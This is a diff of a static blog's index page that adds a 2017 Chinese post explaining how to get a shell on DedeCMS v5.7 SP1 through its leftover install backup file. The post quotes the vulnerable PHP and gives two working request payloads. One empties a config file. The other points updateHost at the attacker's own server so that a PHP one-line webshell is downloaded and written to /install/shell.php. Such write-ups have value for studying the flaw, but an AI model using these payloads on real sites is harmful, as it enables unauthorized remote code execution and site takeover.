@@ -252,6 +252,187 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/11/21/dedegetshell/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Lawliet">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/LuFei.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lawliet Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/11/21/dedegetshell/" itemprop="url">dedecmsv57 sp1远程文件包含漏洞</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-21T21:46:28+08:00">
+                2017-11-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="利用dedecmsv57-sp1远程文件包含漏洞getshell"><a href="#利用dedecmsv57-sp1远程文件包含漏洞getshell" class="headerlink" title="利用dedecmsv57 sp1远程文件包含漏洞getshell"></a>利用dedecmsv57 sp1远程文件包含漏洞getshell</h1><p><strong>比较早的一个漏洞,利用apache解析漏洞,可远程文件包含getshell</strong></p>
+<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p><strong>服务器为apache,dedecms版本为dedecmsv57 sp1,攻击者要有一台自己的远程服务器</strong></p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><strong>漏洞文件位置为/install/index.php.bak</strong></p>
+<pre><code>else if($step==11)
+{
+    require_once(&apos;../data/admin/config_update.php&apos;);
+    $rmurl = $updateHost.&quot;dedecms/demodata.{$s_lang}.txt&quot;;
+
+    $sql_content = file_get_contents($rmurl);
+    $fp = fopen($install_demo_name,&apos;w&apos;);
+    if(fwrite($fp,$sql_content))
+        echo &apos;&amp;nbsp; &lt;font color=&quot;green&quot;&gt;[√]&lt;/font&gt; 存在(您可以选择安装进行体验)&apos;;
+    else
+        echo &apos;&amp;nbsp; &lt;font color=&quot;red&quot;&gt;[×]&lt;/font&gt; 远程获取失败&apos;;
+    unset($sql_content);
+    fclose($fp);
+    exit();
+}
+</code></pre><p><strong>该文件是dedecms安装完成后生成的备份文件,这会将远程服务器<code>$updateHost</code>下的<code>dedecms/demodata.{$s_lang}.txt</code>文件内容写入当前服务器的<code>$install_demo_name</code>文件中,当中有三个关键的可控变量,<code>$updateHost</code>,<code>$s_lang</code>,<code>$install_demo_name</code></strong></p>
+<p><strong>$updateHost来源于<code>../data/admin/config_update.php文件</code></strong></p>
+<pre><code>&lt;?php
+/**
+* 更新服务器，如果有变动，请到 http://bbs.dedecms.com 查询
+ *
+ * @version        $Id: config_update.php 1 11:36 2011-2-21 tianya $
+ * @package        DedeCMS.Administrator
+ * @copyright      Copyright (c) 2007 - 2010, DesDev, Inc.
+ * @license        http://help.dedecms.com/usersguide/license.html
+ * @link           http://www.dedecms.com
+ */
+
+//更新服务器，如果有变动，请到 http://bbs.dedecms.com 查询
+$updateHost = &apos;http://updatenew.dedecms.com/base-v57/&apos;;
+$linkHost = &apos;http://flink.dedecms.com/server_url.php&apos;;
+</code></pre><p><strong>如果我们构造payload为</strong></p>
+<pre><code>/install/index.php.bak?step=11&amp;insLockfile=a&amp;s_lang=a&amp;install_demo_name=../data/admin/config_update.php
+</code></pre><p><strong>这时$rmurl的值就会为<code>http://updatenew.dedecms.com/base-v57/dedecms/demodata.a.txt</code>,这时这个文件明显是不存在的,于是便会将<code>../data/admin/config_update.php</code>的内容写为空</strong></p>
+<p><strong>我们在自己的服务器下创建dedecms/demodata.a.txt文件,里面写入php一句话木马</strong><br><strong>继续构造payload为</strong></p>
+<pre><code>/install/index.php.bak?step=11&amp;insLockfile=a&amp;s_lang=a&amp;install_demo_name=shell.php&amp;updateHost=http://你的服务器地址/
+</code></pre><p><strong>这时$rmurl的值为<a href="http://你的服务器地址/dedecms/demodata.a.txt,于是便可以把我们自己服务器上的一句话写到/install目录下的shell.php中,从而getshell,webshell地址为`/install/shell.php`" target="_blank" rel="external">http://你的服务器地址/dedecms/demodata.a.txt,于是便可以把我们自己服务器上的一句话写到/install目录下的shell.php中,从而getshell,webshell地址为`/install/shell.php`</a></strong></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/11/20/lctf2017/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1552,7 +1733,7 @@ branch: master
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">26</span>
+                  <span class="site-state-item-count">27</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -1574,7 +1755,7 @@ branch: master
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-count">14</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
